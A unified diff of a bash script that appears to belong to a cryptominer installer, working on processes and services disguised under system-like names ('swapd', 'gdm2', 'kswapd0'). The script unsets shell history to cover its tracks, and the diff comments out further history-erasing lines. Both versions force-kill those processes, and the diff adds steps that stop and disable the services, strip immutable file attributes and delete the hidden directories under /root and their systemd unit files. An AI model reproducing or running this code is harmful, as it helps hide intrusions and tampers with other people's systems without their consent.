@@ -1,15 +1,20 @@
 #!/bin/bash
 
 unset HISTFILE
-unset HISTFILE ;history -d $((HISTCMD-1))
-export HISTFILE=/dev/null ;history -d $((HISTCMD-1))
+#unset HISTFILE ;history -d $((HISTCMD-1))
+#export HISTFILE=/dev/null ;history -d $((HISTCMD-1))
 
-#systemctl disable gdm2 --now
-#systemctl disable swapd --now
+systemctl stop gdm2
+systemctl disable gdm2 --now
+
+systemctl stop swapd
+systemctl disable swapd --now
 
 #killall swapd
 kill -9 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-systemctl stop swapd
+
+#killall kswapd0
+kill -9 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
 
 chattr -i /root/.swapd/*
 chattr -i /root/.swapd/
@@ -18,18 +23,18 @@ rm -rf /root/.swapd/
 chattr -i /etc/systemd/system/swapd.service
 rm -rf /etc/systemd/system/swapd.service
 
-chattr -i $HOME/.gdm2/
-chattr -i $HOME/.gdm2/config.json
+chattr -i /root/.gdm2/*
+chattr -i /root/.gdm2/
+chattr -i /root/.gdm2/.swapd
+rm -rf /root/.gdm2/
+chattr -i /etc/systemd/system/gdm2.service
+rm -rf /etc/systemd/system/gdm2.service
 
-chattr -i $HOME/.swapd/
-chattr -i $HOME/.swapd/.swapd
-chattr -i $HOME/.swapd/config.json
-
-#killall kswapd0
-kill -9 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
-
-rm -rf $HOME/.gdm2/
-rm -rf $HOME/.swapd/
+#chattr -i $HOME/.gdm2/
+#chattr -i $HOME/.gdm2/config.json
+#chattr -i $HOME/.swapd/
+#chattr -i $HOME/.swapd/.swapd
+#chattr -i $HOME/.swapd/config.json
 
 VERSION=2.11
 
